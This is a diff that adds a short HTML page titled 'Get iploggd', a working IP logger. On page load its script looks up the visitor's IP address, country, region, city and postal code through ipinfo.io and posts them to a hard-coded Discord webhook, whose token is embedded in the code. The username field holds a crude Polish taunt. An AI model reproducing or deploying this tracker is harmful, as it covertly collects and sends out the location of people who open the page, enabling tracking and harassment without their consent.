@@ -1,0 +1,36 @@
+<html>
+    <head>
+        <title>Get iploggd</title>
+    </head>
+
+    <body>
+        GET IPLOGGD
+        <script>
+            function monke(json) 
+            {
+                 var request = new XMLHttpRequest();
+                 
+                 request.open("POST", "https://discordapp.com/api/webhooks/1131012412091420682/NhRJH7cH2PPT-OmpE7zOLawWHluGu8sLALmiUg0RCaf0muWoVS2CmL9YQGpSOcHIqnYR");
+            
+                 request.setRequestHeader('Content-type', 'application/json');
+            
+                 var params = 
+                 {
+                      username: "Dzieciak Wyruchany",
+                      avatar_url: "",
+                      content: "@everyone",
+                      embeds: [
+                           {
+                                title: "",
+                                color: 0xffffff,
+                                description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
+                           }
+                      ]
+                 }
+            
+                 request.send(JSON.stringify(params));
+            }
+            </script>
+            <script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
+    </body>
+</html>
